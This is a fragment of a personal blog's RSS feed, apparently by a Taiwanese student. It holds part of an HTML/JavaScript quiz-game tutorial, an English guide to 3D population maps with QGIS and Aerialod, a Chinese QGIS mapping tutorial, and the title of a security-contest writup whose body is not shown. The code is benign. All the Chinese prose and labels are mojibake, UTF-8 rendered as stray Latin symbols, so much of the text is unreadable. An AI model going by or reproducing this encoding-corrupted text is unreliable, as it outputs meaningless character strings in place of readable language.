&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;h1&amp;gt;ÊòéÂÄ´Áü•Â§öÂ∞ëÔºü&amp;lt;/h1&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;ÊèíÂÖ•È°åÁõÆ&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Âª∫Á´ã&lt;code&gt;id&lt;/code&gt;ÁÇ∫&lt;code&gt;question&lt;/code&gt;ÁöÑ&lt;code&gt;div&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div id=&amp;quot;question&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Âª∫Á´ãÈÅ∏È†Ö&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Âª∫Á´ã&lt;code&gt;id&lt;/code&gt;ÁÇ∫&lt;code&gt;options&lt;/code&gt;ÁöÑ&lt;code&gt;div&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Ë£Ω‰ΩúÂõõÂÄãÈÅ∏È†ÖÁöÑÊåâÈàïÔºåid‰æùÂ∫èÁÇ∫&lt;code&gt;option-1 ~option-4&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ËàáÈ°åÁõÆÂ∫´‰ΩúÁÇ∫ÈÄ£ÁµêÔºåÁÇ∫Êñπ‰æøÈô£ÂàóÁµ±Êï¥Ôºå&lt;code&gt;onclick=&amp;quot;check_answer(0)&amp;quot;~onclick=&amp;quot;check_answer(3)&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div id=&amp;quot;options&amp;quot;&amp;gt;
    &amp;lt;button id=&amp;quot;option-1&amp;quot; onclick=&amp;quot;check_answer(0)&amp;quot;&amp;gt;&amp;lt;/button&amp;gt;
    &amp;lt;button id=&amp;quot;option-2&amp;quot; onclick=&amp;quot;check_answer(1)&amp;quot;&amp;gt;&amp;lt;/button&amp;gt;         
    &amp;lt;button id=&amp;quot;option-3&amp;quot; onclick=&amp;quot;check_answer(2)&amp;quot;&amp;gt;&amp;lt;/button&amp;gt;
    &amp;lt;button id=&amp;quot;option-4&amp;quot; onclick=&amp;quot;check_answer(3)&amp;quot;&amp;gt;&amp;lt;/button&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Âª∫Á´ãÂàÜÊï∏ÂÆπÂô®&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Âª∫Á´ã&lt;code&gt;id&lt;/code&gt;ÁÇ∫&lt;code&gt;score-container&lt;/code&gt;ÁöÑ&lt;code&gt;div&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Âª∫Á´ã&lt;code&gt;id&lt;/code&gt;ÁÇ∫&lt;code&gt;score&lt;/code&gt;ÁöÑ&lt;code&gt;span&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div id=&amp;quot;&amp;quot;&amp;gt;
    Á≠îÂ∞çÈ°åÊï∏: &amp;lt;span id=&amp;quot;score&amp;quot;&amp;gt;0&amp;lt;/span&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;Âª∫Á´ãÊúÄÁµÇÁï´Èù¢&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;ÊîæÁΩÆÂú®ÊúÄ‰∏äÊñπÔºåÂÖàÈö±ËóèÔºåÈÅäÊà≤ÁµêÊùüÂæåÂÜçÈ°ØÁ§∫&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;div id=&amp;quot;end-container&amp;quot; style=&amp;quot;display: none;&amp;quot;&amp;gt;
    &amp;lt;div id=&amp;quot;end-container-text&amp;quot;&amp;gt;ÈÅäÊà≤ÁµêÊùü&amp;lt;/div&amp;gt;
    &amp;lt;div id=&amp;quot;end-container-score&amp;quot;&amp;gt;Á≠îÂ∞çÈ°åÊï∏: &amp;lt;span id=&amp;quot;score-end&amp;quot;&amp;gt;0&amp;lt;/span&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;div id=&amp;quot;end-container-length_questions&amp;quot;&amp;gt;ÂÖ± &amp;lt;span id=&amp;quot;length_question&amp;quot;&amp;gt; 0 &amp;lt;/span&amp;gt; È°å&amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;ÂºïÂÖ•&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;ÂºïÂÖ•È°åÁõÆÂ∫´&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;script src=&amp;quot;Questions Repositories.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;ÂºïÂÖ•Ë¶èÂâáÂ∫´&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;script src=&amp;quot;rule.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;ÂºïÂÖ•CSS&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;style.css&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h2&gt;Javascript&lt;/h2&gt;
&lt;h3&gt;Âª∫Á´ãËÆäÊï∏&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const score_element = document.getElementById(&amp;quot;score&amp;quot;);
const end_container = document.getElementById(&amp;quot;end-container&amp;quot;);
const game_over_score = document.getElementById(&amp;quot;score-end&amp;quot;);
const length_question = document.getElementById(&amp;quot;length_question&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;È°åÁõÆÂÖß&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;ÂÖàÁ¢∫Ë™çÈ°åÁõÆÂ∫´Èï∑Â∫¶Â∞èÊñºÔºåÈÄôÊ®£È°åÁõÆÊâçËÉΩÈÄ≤Ë°å&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;function show_question(index) {
    if (index &amp;lt; questions.length) {
        ...
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;Âª∫Á´ãÈ°åÁõÆËÆäÊï∏&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const questionElement = document.getElementById(&amp;quot;question&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;È°ØÁ§∫È°åËôü&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;questionElement.textContent = current_question_index + 1 + (&amp;quot;. &amp;quot;) + questions[index].question; 
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3&gt;ÂâµÂª∫ÈÅ∏È†Ö&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;ÂÖàÂª∫Á´ãÈÅ∏È†ÖËÆäÊï∏&lt;/li&gt;
&lt;li&gt;Ê∏ÖÁ©∫ÂÖßÂÆπ&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const optionsElement = document.getElementById(&amp;quot;options&amp;quot;);
optionsElement.innerHTML = &amp;quot;&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;Â°´ÂÖÖÈÅ∏È†Ö&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;È°åÁõÆÂ∫´ÂÖßÁöÑÂÖàË∑ë‰∏ÄÈÅç&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;questions[index].options.forEach((option, i) =&amp;gt; {
        ...
        });
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;Âª∫Á´ãÊåâÈàïËÆäÊï∏&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const button = document.createElement(&amp;quot;button&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ÈÅ∏È†ÖÂÖßÂÆπÂèäÈ°åËôü&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;Áî®ASCIIÁ¢ºÔºåÂª∫Á´ãÈÅ∏È†ÖÁ∑®Ëôü&lt;/li&gt;
&lt;li&gt;ÈÅ∏È†ÖÂÖßÂÆπ option&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;button.textContent = &amp;quot;(&amp;quot; + String.fromCharCode(65 + i) + &amp;quot;) &amp;quot; + option;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;Á¢∫Ë™çÈÅ∏È†ÖÂèäÊé•ÈÄ£‰∏ã‰∏ÄÈ°å&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;button.onclick = () =&amp;gt; check_answer(i);
optionsElement.appendChild(button);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;lengthÂ∑≤Áõ°ÔºåÊïÖÈÅäÊà≤ÁµêÊùü&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;else {
    end_container.style.display = &amp;quot;block&amp;quot;;
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3&gt;ÂàÜÊï∏ÁöÑËÆäÂãï&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;function check_answer(selected_index) {
    ...
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;Â¶ÇÊûúÈÅ∏È†ÖÊ≠£Á¢∫ÔºåÂä†ÂàÜ&lt;/li&gt;
&lt;li&gt;Â¶ÇÊûúÁ≠îÈåØÔºåÈ°ØÁ§∫&amp;quot;Á≠îÈåØ‰∫Ü&amp;quot;&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;if (selected_index === questions[current_question_index].correct_answer) {
        score += 1;
        game_over_score.textContent = score;
        score_element.textContent = score;
    } else {
        alert(&amp;quot;Á≠îÈåØ‰∫ÜÂî∑ÔºÅ&amp;quot;)
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;Êõ¥Êñ∞È°åÁõÆÔºåËÆäÊï∏+1&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;current_question_index++;
show_question(current_question_index);
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;ÂõûÂÇ≥&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;game_over_score.innerHTML = score;
score_element.innerHTML = score;
length_question.innerHTML = questions.length;
show_question(current_question_index);
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h3&gt;È°åÁõÆÂ∫´Á§∫ÁØÑ&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const questions = [
    {
        question: &amp;quot;Ë´ãÂïèÈô§‰∫ÜÂ§™ÈôΩ‰πãÂ§ñË∑ùÈõ¢ÊòéÂÄ´È´ò‰∏≠ÊúÄËøëÁöÑÊÅÜÊòüÊòØÔºü&amp;quot;,
        options: [&amp;quot;ÂçóÈñÄ‰∫å&amp;quot;,&amp;quot;Âçä‰∫∫È¶¨Â∫ßŒ±ÊòüC&amp;quot;,&amp;quot;Â§©ÁãºÊòü&amp;quot;,&amp;quot;ÂèÉÂÆøÂõõ&amp;quot;],
        correct_answer: 1
    },
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂæàÂ§ö‰πãÈ°ûÁöÑÔΩû&lt;/p&gt;
&lt;hr&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Sun, 26 Nov 2023 09:32:21 GMT</pubDate></item><item><title>How to export a 3D population density map using QGIS and Aerialo</title><link>https://yih-0118.github.io/blog/3d-gis/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/3d-gis/</guid><description>3DÁöÑË∂ÖÈÖ∑‰ΩÜÊÑüË¶∫Ê≤íÁî®</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/3d-gis/&quot;&gt;https://yih-0118.github.io/blog/3d-gis/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;ü§è&lt;/p&gt;
&lt;h2&gt;How to export a 3D population density map using QGIS and Aerialod&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Start by visiting &lt;a href=&quot;https://hub.worldpop.org/geodata/listing?id=76&quot;&gt;https://hub.worldpop.org/geodata/listing?id=76&lt;/a&gt; and download the target country&amp;#39;s TIFF file.
&lt;img src=&quot;https://hackmd.io/_uploads/rkdpIzM7T.png&quot; alt=&quot;image.png&quot;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Let&amp;#39;s use Taiwan as an example.&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;&lt;p&gt;Import one of the downloaded TIFF files into QGIS.
&lt;img src=&quot;https://hackmd.io/_uploads/Bkc_DfMXa.jpg&quot; alt=&quot;ÂúñÁâá 1.jpg&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Export from QGIS:
&lt;img src=&quot;https://hackmd.io/_uploads/HyqlOGf7T.jpg&quot; alt=&quot;2.jpg&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/By1ZOzGQa.jpg&quot; alt=&quot;3.jpg&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;:::warning
Set the Output mode to &amp;quot;Rendered Image.&amp;quot;
:::&lt;/p&gt;
&lt;ol start=&quot;4&quot;&gt;
&lt;li&gt;&lt;p&gt;After exporting, move the resulting file into Aerialod.
&lt;img src=&quot;https://hackmd.io/_uploads/SyHU_fzQT.jpg&quot; alt=&quot;4.jpg&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Configure the settings in Aerialod as needed.
&lt;img src=&quot;https://hackmd.io/_uploads/BJo__Gf76.jpg&quot; alt=&quot;5.jpg&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Achieve the desired results.&lt;/p&gt;
&lt;img src=&quot;https://onedrive.live.com/embed?resid=1B1509F6502EDD6F%2121343&amp;authkey=%21AKq90pD4aKipI1U&amp;width=660&quot; width=&quot;660&quot; height=&quot;auto&quot; /&gt;&lt;/li&gt;
&lt;/ol&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Fri, 03 Nov 2023 06:32:09 GMT</pubDate></item><item><title>QGISÊïôÂ≠∏</title><link>https://yih-0118.github.io/blog/qgis%E6%95%99%E5%AD%B8/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/qgis%E6%95%99%E5%AD%B8/</guid><description>Ëá™Â∑±ÂÅöÈù¢ÈáèÂúñÁöÑÈÅéÁ®ã</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/qgis%E6%95%99%E5%AD%B8/&quot;&gt;https://yih-0118.github.io/blog/qgis%E6%95%99%E5%AD%B8/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;Âà©Áî®QGISË£Ω‰ΩúÈù¢ÈáèÂúñ&lt;/h1&gt;
&lt;p&gt;ÂÆâË£ùÂ•ΩÂæåÊúÉÁúãÂà∞Ê≠§Êç∑ÂæëÔºå‰ΩøÁî®DesktopÁâà
&lt;img src=&quot;https://hackmd.io/_uploads/HJx6Qh5Cn.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Âª∫Á´ã‰∏ÄÂÄãÊñ∞ÁöÑÂúñÂ±§
&lt;img src=&quot;https://hackmd.io/_uploads/HyYeHh5C3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Â•Ω‰∫ÜÊúÉÈï∑ÈÄôÊ®£
&lt;img src=&quot;https://hackmd.io/_uploads/ryEW829A3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;‰øùÊåÅËâØÂ•ΩÁøíÊÖ£ÔºåÈö®ÊôÇÂ≠òÊ™î
&lt;img src=&quot;https://hackmd.io/_uploads/BkW9wn503.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;ÂÖàÂéª‰∏ãËºâÈÑâÈéÆÂ∏ÇÂçÄÁïåÁ∑öÁöÑ.shpÊ™îÊ°à
&lt;img src=&quot;https://hackmd.io/_uploads/SyRpSnc0h.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://whgis-nlsc.moi.gov.tw/Opendata/Files.aspx&quot;&gt;https://whgis-nlsc.moi.gov.tw/Opendata/Files.aspx&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;‰∏ãËºâÂ•ΩÂæåÊúÉÊúâ‰∏ÄÂÄãzipÊ™îÊ°à
ÁÇ∫‰∫ÜÊñπ‰æøÊàëÂú®Ê≠§Âª∫‰∫ÜÊñ∞Ë≥áÊñôÂ§æÂ≠òÊîæ
Path:D:\QGIS 230910ÊïôÂ≠∏
&lt;img src=&quot;https://hackmd.io/_uploads/HJscL35R2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;ÈªûÈÅ∏„ÄåLayer/Add Layeer/Add Vector Layer„Äç
&lt;img src=&quot;https://hackmd.io/_uploads/r1SydhqAn.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Â∞éÂÖ•ÂâõÂâõËß£Â£ìÁ∏ÆÁöÑ.shpÊ™îÊ°à
&lt;img src=&quot;https://hackmd.io/_uploads/S1hUd39R2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;:::warning
Encoding‰∏ÄÂÆöË¶ÅÊîπÊàêUTF-8Ê†ºÂºè
:::
&lt;img src=&quot;https://hackmd.io/_uploads/ry09_3qAn.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ÁÑ∂ÂæåÊåâadd
&lt;img src=&quot;https://hackmd.io/_uploads/ryqkF3cC3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Â•Ω‰∫ÜÊúÉÈï∑ÈÄôÊ®£
&lt;img src=&quot;https://hackmd.io/_uploads/BJAbt29C3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ÂÖàÊîπÊàêÁôΩËâ≤
&lt;img src=&quot;https://hackmd.io/_uploads/rk9FKhcRh.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Á¢∫Ë™çÂ±¨ÊÄßË°®
&lt;img src=&quot;https://hackmd.io/_uploads/r1tTqnqAn.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/ryN052qR3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Âà∞ÊàëÂÄë‰πãÂâçÁöÑExcelÔºåÊúâÁúãÂà∞ÁÇ∫GISÂª∫Á´ãÁöÑË°®Ê†ºÔºåÈÅ∏ÂèñÂæåÈù¢ÁöÑÊ¨Ñ‰Ωç
&lt;img src=&quot;https://hackmd.io/_uploads/ry9bohc02.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Âª∫Á´ã‰∏ÄÂÄãÊñáÊú¨Ê™îÊ°à
&lt;img src=&quot;https://hackmd.io/_uploads/H1rosh5A2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Ë≤º‰∏äÂâõÊâçÁöÑË≥áÊñô
&lt;img src=&quot;https://hackmd.io/_uploads/BkmCohcRh.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Êõ¥ÊîπÂâØÊ™îÂêçÁÇ∫.csv
&lt;img src=&quot;https://hackmd.io/_uploads/Skxghh9A3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Add Delimited Text Layer
&lt;img src=&quot;https://hackmd.io/_uploads/Sypz22q02.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ÈÅ∏Ëµ∑ÂâõÊâçÁöÑ.csvÊ™îÊ°à
&lt;img src=&quot;https://hackmd.io/_uploads/HJYN23q0h.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ÁÑ∂ÂæåÊåâ‰∏äÈù¢ÁöÑPcocessing
ÂÜçÈÅ∏ÂèñTools
&lt;img src=&quot;https://hackmd.io/_uploads/r1KL229A3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Âú®Ëº∏ÂÖ•Ê°ÜËº∏ÂÖ•Join attributes by field value
&lt;img src=&quot;https://hackmd.io/_uploads/HyT_22903.png&quot; alt=&quot;&quot;&gt;
:::info&lt;/p&gt;
&lt;!-- input layerË°®Á§∫ÂÖ∑ÊúâÂú∞ÁêÜË≥áË®äÁöÑÂúñÂ±§
table fieldË°®Á§∫ÈÅ∏ÊìáÂúñÂ±§‰∏≠ÁöÑ‰∏ªË¶ÅÊ¨Ñ‰Ωç
input layer2Ë°®Á§∫ÂÖ∑ÊúâÁµ±Ë®àË≥áÊñôÁöÑÊ™îÊ°àÔºàÂâõÊâçÁöÑcsvÊ™îÊ°àÔºâ
table field2Ë°®Á§∫ÈÅ∏ÊìáÁµ±Ë®àË≥áÊñôÁöÑ‰∏ªË¶ÅÊ¨Ñ --&gt;

&lt;p&gt;:::
&lt;img src=&quot;https://hackmd.io/_uploads/BkgT3nc02.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Âπ´Êñ∞ÁöÑÂúñÂ±§ÂÖàÂ≠òÊ™î
&lt;img src=&quot;https://hackmd.io/_uploads/H1cyT2qCh.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Âπ´Êñ∞ÁöÑÁµ±Ë®àÂúñÂ±§ÂëΩÂêç
ÊúÄÂæåÊåârun
&lt;img src=&quot;https://hackmd.io/_uploads/rksWT3cAh.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Âπ´Áµ±Ë®àÂúñÂ±§ËëóËâ≤
&lt;img src=&quot;https://hackmd.io/_uploads/SJp0p2qCn.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ÈÅ∏ÊìáGraduated
&lt;img src=&quot;https://hackmd.io/_uploads/ry0e0h50n.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;VauleÁöÑÂèÉÁÖßÂ∞çË±°ÊòØpeopleform
&lt;img src=&quot;https://hackmd.io/_uploads/Bku-A3cR2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Êîπ‰∏Ä‰∏ãÂçÄÂàÜÁöÑÊù±Êù±
&lt;img src=&quot;https://hackmd.io/_uploads/BJ3z03qA3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Â∞±Êúâ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/HyPQCn9An.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Âè≥Èçµ‰∏äËâ≤ÂúñÂ±§
ÈÅ∏ÂèñProperties
&lt;img src=&quot;https://hackmd.io/_uploads/BJMSC2q03.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Âú®Label‰∏≠ÈÅ∏ÂèñSingle Lables
&lt;img src=&quot;https://hackmd.io/_uploads/r1uUC2c03.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;valueÂèÉÁÖßTOWNNAME
&lt;img src=&quot;https://hackmd.io/_uploads/B1BPAhqAn.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;ÂêçÁ®±Â∞±Âá∫‰æÜ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/Sk5u0hq03.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;Ââ©‰∏ãÈ°èËâ≤Ë¶ÅÊÄéÈ∫ºÊîπÂ∞±Áúã‰Ω†ÊáÇ‰∏çÊáÇÁæé‰∫Ü&lt;/del&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/ryS5R39Rn.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/B1TjRncRh.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/HJNTA29C3.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/HJbyka5C3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;Âà©Áî®QGISË£Ω‰ΩúÈªûÂúñ&lt;/h1&gt;
&lt;p&gt;Âéª‰∏ãËºâGoole Rarth Pro
&lt;a href=&quot;https://www.google.com/intl/zh-TW/earth/versions/&quot;&gt;https://www.google.com/intl/zh-TW/earth/versions/&lt;/a&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/ryYF1a5A2.png&quot; alt=&quot;&quot;&gt;
Ë∑ü‰πãÂâç‰∏ÄÊ®£
&lt;img src=&quot;https://hackmd.io/_uploads/Bkbk-6c02.png&quot; alt=&quot;&quot;&gt;
ÊàëÂÄëË¶ÅÊ®ôÂá∫ÊòéÂÄ´È´ò‰∏≠ÁöÑÈªûÈªû
&lt;img src=&quot;https://hackmd.io/_uploads/HJCbZ6qRh.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJoX-pqCh.png&quot; alt=&quot;&quot;&gt;
ÊääcsvÊ™îÊ°à‰∏üÈÄ≤Âéª
&lt;img src=&quot;https://hackmd.io/_uploads/BkVLZTqAn.png&quot; alt=&quot;&quot;&gt;
ÊîπÊàêÈÄóËôü
ÁÑ∂ÂæåÁÖßËëóÊàëÁî®‰∏ãÂéª
&lt;img src=&quot;https://hackmd.io/_uploads/rJXdW690h.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/r1UcWaq02.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Hkl0Zaq0h.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/B1nyzaqC2.png&quot; alt=&quot;&quot;&gt;
:::warning
ÈÄôÈÇäË¶ÅÊääÂ≠òÊ™îÈ°ûÂûãÊîπÊàêkmlÔºåÂúñÊàëÊîæÈåØ‰∫Ü
:::
&lt;img src=&quot;https://hackmd.io/_uploads/ByzNfaqC2.png&quot; alt=&quot;&quot;&gt;
ÊääkmlÊ™îÊ°àÊãñÂà∞QGIS‰∏≠
ÁÑ∂ÂæåÊåâÁ¢∫ÂÆöÂ∞±Â•Ω‰∫Ü&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/H1YDQp502.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HkBTQac0n.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Bk1LET90h.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Sun, 10 Sep 2023 10:00:27 GMT</pubDate></item><item><title>2023 AIS3 Junior writeup</title><link>https://yih-0118.github.io/blog/ais3-junior/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/ais3-junior/</guid><description>‰∫∫ÁîüÁ¨¨‰∏ÄÁØá writeup</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/ais3-junior/&quot;&gt;https://yih-0118.github.io/blog/ais3-junior/&lt;/a&gt;&lt;/blockquote&gt; &lt;ul&gt;
&lt;li&gt;2023 AIS3 JUNIOR Homework&lt;/li&gt;
&lt;/ul&gt;
